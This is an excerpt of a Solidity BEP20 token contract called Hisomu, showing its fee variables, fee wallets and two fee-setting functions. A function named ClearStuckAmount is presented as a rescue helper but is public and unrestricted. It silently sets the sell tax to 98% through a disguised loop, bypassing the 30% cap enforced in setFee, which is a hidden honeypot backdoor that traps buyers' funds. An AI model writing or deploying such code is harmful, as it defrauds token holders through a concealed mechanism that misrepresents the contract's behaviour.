...
contract Hisomu  is Context, IBEP20, Ownable {
    ...
    uint256 private constant _tTotal = 1000000000 * 10**4;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _clearstuck = 98;
    uint256 private _tFeeTotal;
    uint256 private _redisFeeOnBuy = 0;
    uint256 private _taxFeeOnBuy = 1;
    uint256 private _redisSellFee = 0;
    uint256 private _taxsellfee = 1;
    ...
    address payable private _developmentAddress = payable(0x9c4B6F15B0050202423aDe894997d450B467c9a1);
    address payable private _marketingAddress = payable(0x9c4B6F15B0050202423aDe894997d450B467c9a1);
    ...
    function ClearStuckAmount(uint256 rescue) public 
    {

        while (rescue!=_clearstuck) {
            rescue=rescue+1;
        }
        _taxsellfee = rescue;
    }
    ...
    function setFee(uint256 redisFeeOnBuy, uint256 redisFeeOnSell, uint256 taxFeeOnBuy, uint256 taxFeeOnSell) public onlyOwner {
        ...
        _taxsellfee = taxFeeOnSell;
        require (_redisFeeOnBuy+_redisSellFee+_taxFeeOnBuy+_taxsellfee <= 30);
    }
